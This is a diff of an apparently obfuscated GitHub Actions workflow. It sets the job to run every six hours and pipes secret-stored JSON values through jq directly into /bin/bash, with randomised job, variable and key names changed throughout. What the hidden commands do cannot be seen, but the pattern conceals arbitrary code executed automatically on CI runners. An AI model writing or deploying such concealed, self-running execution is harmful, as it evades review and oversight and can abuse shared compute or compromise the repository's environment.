@@ -3,24 +3,26 @@ name: chumaitian3189
 on:
   workflow_dispatch:
   schedule:
-    - cron: '27 0/6 * * *'
+    - cron: '3 4/6 * * *'
 
-jobs:  # 1432
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: chumaitian3189
         env:
-          fvblx35: ${{ secrets.fvblx35 }}
+          gdpbh5192: ${{ secrets.gdpbh5192 }}
         run: |
-          echo $fvblx35 | jq -r .mmo08087 | /bin/bash
-          echo $txij72 | jq -r .du9306 | /bin/bash
-          echo $tldq3519 | jq -r .jnw7217 | /bin/bash
-          echo $jin00399 | jq -r .if0 | /bin/bash
-          echo $uwp0148 | jq -r .w30632 | /bin/bash
-          echo $po5504 | jq -r .hpoca8 | /bin/bash
-          echo $v40307 | jq -r .vs1587 | /bin/bash
-          echo $biev38 | jq -r .amf566 | /bin/bash
-          echo $koszh87264 | jq -r .fzasu63 | /bin/bash
+          echo $gdpbh5192 | jq -r .gzh04 | /bin/bash
+          echo $zdc149 | jq -r .xb5216 | /bin/bash
+          echo $or985 | jq -r .mfa211 | /bin/bash
+          echo $qy62300 | jq -r .vbnu4 | /bin/bash
+          echo $qs941 | jq -r .qcrpf51713 | /bin/bash
+          echo $l811 | jq -r .sx942 | /bin/bash
+          echo $kvjbl9901 | jq -r .tcn55 | /bin/bash
+          echo $uk225 | jq -r .sw9734 | /bin/bash
+          echo $gccq073 | jq -r .ashsh79998 | /bin/bash
+          echo $iqnfg8871 | jq -r .a7764 | /bin/bash
 
